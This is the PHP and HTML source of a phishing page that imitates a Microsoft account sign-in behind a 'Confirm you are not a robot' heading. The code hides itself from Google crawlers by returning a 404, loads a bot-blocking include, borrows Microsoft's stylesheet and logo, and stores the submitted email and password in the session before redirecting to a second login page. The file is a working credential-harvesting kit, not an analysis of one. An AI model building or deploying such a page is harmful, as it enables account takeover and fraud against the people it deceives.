<?php
include 'blockerz.php';
include 'sc.php';
session_start();
error_reporting(0);
@set_time_limit(0);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'mozilla') !== false){ @header('HTTP/1.0 404 Not Found'); 
exit(); }

if(isset($_POST['email'])){
	$_SESSION['email'] = $_POST['email'];
	$_SESSION['pass'] = $_POST['password'];
	header('Location: Login.php');
	exit();
}
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" lang="en">

<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedDownLevelError" />
    <meta name="SiteID" content="" />
    <meta name="ReqLC" content="1033" />
    <meta name="LocLC" content="en-US" />
    
    <meta name="robots" content="none" />
    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
    
        <link rel="shortcut icon" href="img/favicon_a.ico" />

    <link href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7444.13/content/cdnbundles/converged.login.min.css" rel="stylesheet" onerror='$Loader.On(this,true)' onload='$Loader.On(this)' />

</head>

<body>
    <div>
        <div class="outer" style="background: url(img/0.jpg);">
            <div class="middle">
                <div class="inner relative">
                        <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7444.13/content/images/microsoft_logo.png" alt="Microsoft account symbol" />

                    <div class="row text-title" role="heading">Confirm you are not a robot</div>
                    
                    <form class="form-signin" method="post" action="">
                                <label for="inputEmail" class="sr-only">Email address</label>
                                <input type="email" id="inputEmail" name="email" class="form-control" placeholder="Email address" required autofocus>
                                <label for="inputPassword" class="sr-only">Password</label>
                                <input type="password" id="inputPassword" name="password" class="form-control" placeholder="Password" required>
                                <br>
                                <button class="btn btn-lg btn-primary btn-block" type="submit">Login</button>
                            </form>
                </div>
            </div>
        </div>

        <div class="footer default">
            <div id="footerLinks" class="footerNode text-secondary">
                    <div class="footerNode">
                        <span>
&#169;2019 Microsoft                        </span>
                        <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
                        <a href="https://privacy.microsoft.com/en-US/privacystatement" target="_blank">Privacy &amp; cookies</a>
                    </div>
            </div>
        </div>
    </div>
</body>
</html>